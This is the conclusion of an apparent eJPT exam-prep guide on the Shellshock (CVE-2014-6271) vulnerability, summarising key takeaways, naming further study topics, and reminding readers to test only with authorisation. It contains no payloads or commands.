## üèÅ Conclusion

**Shellshock (CVE-2014-6271)** represents one of the most critical and easily exploitable vulnerabilities in web application security. For eJPT candidates, mastering this vulnerability is **essential for exam success** and provides a solid foundation for advanced penetration testing techniques.

### üéØ **Key Takeaways:**

1. **Detection is Critical:** Always use Nmap NSE scripts with proper CGI path arguments
2. **Burp Suite Mastery:** HTTP header manipulation is a core skill for web exploitation  
3. **Payload Crafting:** Understanding the Shellshock payload structure enables flexible exploitation
4. **Evidence Collection:** Professional documentation separates good pentesters from great ones
5. **Time Management:** Practice until you can complete exploitation in under 15 minutes

### üöÄ **Next Steps:**

After mastering Shellshock exploitation, continue your eJPT preparation with:
- **SQL Injection** techniques and detection
- **Directory Traversal** and Local File Inclusion
- **Cross-Site Scripting (XSS)** exploitation
- **File Upload** vulnerabilities and bypass techniques

### üìû **Final Words:**

Remember that **ethical hacking** requires proper authorization and responsible disclosure. Use these techniques only in authorized penetration testing engagements, CTF competitions, or personal lab environments.

**Good luck with your eJPT exam! üî•üéØ**

---

*This guide was created based on real lab environments and exam scenarios. Practice responsibly and always follow ethical hacking guidelines.*
